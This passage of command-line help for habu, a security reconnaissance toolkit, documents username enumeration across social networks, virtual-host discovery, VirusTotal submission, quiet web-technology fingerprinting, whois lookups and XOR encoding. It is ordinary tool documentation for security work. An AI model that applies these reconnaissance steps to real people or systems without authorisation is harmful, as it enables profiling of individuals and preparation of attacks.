     --help      Show this message and exit.

habu.usercheck
--------------

.. code-block::

   Usage: habu.usercheck [OPTIONS] USERNAME

     Check if the given username exists on various social networks and other
     popular sites.

     $ habu.usercheck portantier
     {
         "aboutme": "https://about.me/portantier",
         "disqus": "https://disqus.com/by/portantier/",
         "github": "https://github.com/portantier/",
         "ifttt": "https://ifttt.com/p/portantier",
         "lastfm": "https://www.last.fm/user/portantier",
         "medium": "https://medium.com/@portantier",
         "pastebin": "https://pastebin.com/u/portantier",
         "pinterest": "https://in.pinterest.com/portantier/",
         "twitter": "https://twitter.com/portantier",
         "vimeo": "https://vimeo.com/portantier"
     }

   Options:
     -c      Disable cache
     -v      Verbose output
     -w      Open each valid url in a webbrowser
     --help  Show this message and exit.

habu.vhosts
-----------

.. code-block::

   Usage: habu.vhosts [OPTIONS] HOST

     Use Bing to query the websites hosted on the same IP address.

     $ habu.vhosts www.telefonica.com
     www.telefonica.com -> 212.170.36.79
     [
         'www.telefonica.es',
         'universitas.telefonica.com',
         'www.telefonica.com',
     ]

   Options:
     -c          Disable cache
     -p INTEGER  Pages count (Default: 10)
     -f INTEGER  First result to get (Default: 1)
     --help      Show this message and exit.

habu.virustotal
---------------

.. code-block::

   Usage: habu.virustotal [OPTIONS] INPUT

     Send a file to VirusTotal https://www.virustotal.com/ and print the report
     in JSON format.

     Note: Before send a file, will check if the file has been analyzed before
     (sending the sha256 of the file), if a report exists, no submission will
     be made, and you will see the last report.

     $ habu.virustotal meterpreter.exe
     Verifying if hash already submitted: f4826b219aed3ffdaa23db26cfae611979bf215984fc71a1c12f6397900cb70d
     Sending file for analysis
     Waiting/retrieving the report...
     {
         "md5": "0ddb015b5328eb4d0cc2b87c39c49686",
         "permalink": "https://www.virustotal.com/file/c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23/analysis/1526850717/",
         "positives": 49,
         "resource": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
         "response_code": 1,
         "scan_date": "2018-05-20 21:11:57",
         "scan_id": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23-1526850717",
         "scans": {
             "ALYac": {
                 "detected": true,
                 "result": "Trojan.CryptZ.Gen",
                 "update": "20180520",
                 "version": "1.1.1.5"
             },
             ... The other scanners ...
         },
         "sha1": "5fa33cab1729480dd023b08f7b91a945c16d0a9e",
         "sha256": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
         "total": 67,
         "verbose_msg": "Scan finished, information embedded"
     }

   Options:
     -v      Verbose output
     --help  Show this message and exit.

habu.webid
----------

.. code-block::

   Usage: habu.webid [OPTIONS] URL

     Use Wappalyzer apps.json database to identify technologies used on a web
     application.

     Reference: https://github.com/AliasIO/Wappalyzer

     Note: This tool only sends one request. So, it's stealth and not
     suspicious.

     $ habu.webid https://woocomerce.com
     {
         "Nginx": {
             "categories": [
                 "Web Servers"
             ]
         },
         "PHP": {
             "categories": [
                 "Programming Languages"
             ]
         },
         "WooCommerce": {
             "categories": [
                 "Ecommerce"
             ],
             "version": "6.3.1"
         },
         "WordPress": {
             "categories": [
                 "CMS",
                 "Blogs"
             ]
         },
     }

   Options:
     -c      Disable cache
     -v      Verbose output
     --help  Show this message and exit.

habu.web.report
---------------

.. code-block::

   Usage: habu.web.report [OPTIONS] [F]

     Uses Firefox to take a screenshot of the websites. (you need firefox
     installed, obviously)

     Makes a report that includes the HTTP headers.

     The expected format is one url per line.

     Creates a directory called 'report' with the content inside.

     $ echo https://www.portantier.com | habu.web.report

   Options:
     -v      Verbose output
     --help  Show this message and exit.

habu.web.screenshot
-------------------

.. code-block::

   Usage: habu.web.screenshot [OPTIONS] URL

     Uses Firefox to take a screenshot (you need firefox installed, obviously)

     $ habu.web.screenshot https://www.portantier.com

   Options:
     -o TEXT  Output file. (default: screenshot.png)
     --help   Show this message and exit.

habu.whois.domain
-----------------

.. code-block::

   Usage: habu.whois.domain [OPTIONS] DOMAIN

     Simple whois client to check domain names.

     Example:

     $ habu.whois.domain portantier.com
     {
         "domain_name": "portantier.com",
         "registrar": "Amazon Registrar, Inc.",
         "whois_server": "whois.registrar.amazon.com",
         ...

   Options:
     --help  Show this message and exit.

habu.whois.ip
-------------

.. code-block::

   Usage: habu.whois.ip [OPTIONS] IP

     Simple whois client to check IP addresses (IPv4 and IPv6).

     Example:

     $ habu.whois.ip 8.8.8.8
     {
         "nir": null,
         "asn_registry": "arin",
         "asn": "15169",
         "asn_cidr": "8.8.8.0/24",
         "asn_country_code": "US",
         "asn_date": "1992-12-01",
         "asn_description": "GOOGLE - Google LLC, US",
         "query": "8.8.8.8",
         ...

   Options:
     --help  Show this message and exit.

habu.xor
--------

.. code-block::

   Usage: habu.xor [OPTIONS]

     XOR cipher.

     Note: XOR is not a 'secure cipher'. If you need strong crypto you must use
     algorithms like AES. You can use habu.fernet for that.

     Example:

     $ habu.xor -k mysecretkey -i /bin/ls > xored
     $ habu.xor -k mysecretkey -i xored > uxored
     $ sha1sum /bin/ls uxored
     $ 6fcf930fcee1395a1c95f87dd38413e02deff4bb  /bin/ls
     $ 6fcf930fcee1395a1c95f87dd38413e02deff4bb  uxored

   Options:
     -k TEXT      Encryption key
     -i FILENAME  Input file (default: stdin)
     -o FILENAME  Output file (default: stdout)
     --help       Show this message and exit.
